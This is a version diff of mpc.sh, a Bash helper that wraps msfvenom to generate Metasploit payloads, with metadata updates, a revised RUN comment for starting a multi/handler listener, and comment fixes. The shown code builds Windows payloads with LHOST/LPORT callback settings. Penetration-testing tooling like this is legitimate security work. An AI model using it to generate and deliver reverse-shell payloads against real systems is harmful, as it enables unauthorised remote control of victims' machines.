@@ -1,12 +1,12 @@
 #!/bin/bash
 #-Metadata----------------------------------------------------#
-#  Filename: mpc.sh (v1.3.2)             (Update: 2015-08-17) #
+#  Filename: mpc.sh (v1.3.3)             (Update: 2015-11-06) #
 #-Info--------------------------------------------------------#
 #  Quickly generate Metasploit payloads using msfvenom.       #
 #-Author(s)---------------------------------------------------#
 #  g0tmilk ~ https://blog.g0tmi1k.com/                        #
 #-Operating System--------------------------------------------#
-#  Designed for & tested on: Kali Linux & Metasploit v4.11+   #
+#  Designed for & tested on: Kali Linux 2 & Metasploit v4.11+ #
 #-Licence-----------------------------------------------------#
 #  MIT License ~ http://opensource.org/licenses/MIT           #
 #-Notes-------------------------------------------------------#
@@ -141,7 +141,7 @@ function doAction {
 
   cat <<EOF > "${FILEHANDLE}"
 #
-# RUN:   service postgresql start;service metasploit start; msfconsole -q -r "${FILENAME}"
+# RUN:   systemctl start postgresql; msfdb start; msfconsole -q -r "${FILEHANDLE}"
 #
 use exploit/multi/handler
 set PAYLOAD ${PAYLOAD}
@@ -715,16 +715,16 @@ elif [[ "${TYPE}" == "windows" || "${TYPE}" == "win" || "${TYPE}" == "exe" ]]; t
   CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
-# Batch/Loop modes
+## Batch/Loop modes
 elif [[ "${BATCH}" == "true" || "${LOOP}" == "true" ]]; then
   #SUCCESS=true
   exit 0
 
-# Blank input
+## Blank input
 elif [[ -z "${TYPE}" ]]; then
   echo -e "\n ${YELLOW}[i]${RESET} ${YELLOW}Missing type${RESET}"
 
-# Unexected input
+## Unexpected input
 else
   echo -e "\n ${YELLOW}[i]${RESET} Unknown type: ${YELLOW}${TYPE}${RESET}" >&2
 fi
